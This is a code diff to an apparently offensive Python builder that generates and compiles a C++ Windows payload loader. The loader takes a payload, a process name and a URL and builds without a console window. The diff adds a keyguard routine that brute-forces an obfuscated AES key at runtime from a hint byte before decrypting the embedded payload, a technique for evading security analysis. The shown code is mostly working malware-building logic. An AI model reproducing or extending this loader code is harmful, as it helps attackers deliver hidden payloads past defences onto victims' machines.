@@ -18,6 +18,7 @@ def build (Encryption, Enumeration, Payload, ProcessName, Loader, Url):
     if Encryption != "null":
         f.write(f"""\n
 #include "Libraries/{Encryption}"
+#include "Libraries/KeyBrute.h"
 """)
         
     if Enumeration != "null":
@@ -35,6 +36,7 @@ def build (Encryption, Enumeration, Payload, ProcessName, Loader, Url):
         f.write(f"""\n
 {Payload} 
 """)
+        
     f.write(f"""\n
 using namespace std;
 int main()
@@ -75,10 +77,15 @@ int main()
 
     if Encryption != "null":
         f.write(f"""\n
-    char bKey[] = {{ 0x00, 0x11, 0x22 }};
-    size_t sKeySize = sizeof(bKey);
-    PBYTE pbKey = (PBYTE)bKey;
-    Decrypt(pPayloadAddress, pPayloadSize, pbKey, sKeySize);
+    {get_keyguard()[1]}
+    
+    #define HINT_BYTE {get_keyguard()[2]}
+    size_t sKeySize = sizeof(ProtectedKey);
+    PBYTE pbKey = (PBYTE)ProtectedKey;
+    PBYTE pbRealKey;
+    BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
+    size_t sRealKeySize = sizeof(pbRealKey);
+    Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);
 """)
 
     f.write(f"""\n
@@ -93,7 +100,7 @@ int main()
 
     f.close()
     time.sleep(2)
-    return os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -O2 -w -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
+    return os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -O2 -w -s -o chungus main.cpp TinyAES.c -lwininet -lws2_32 -mwindows")
     #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     #print(result)
 
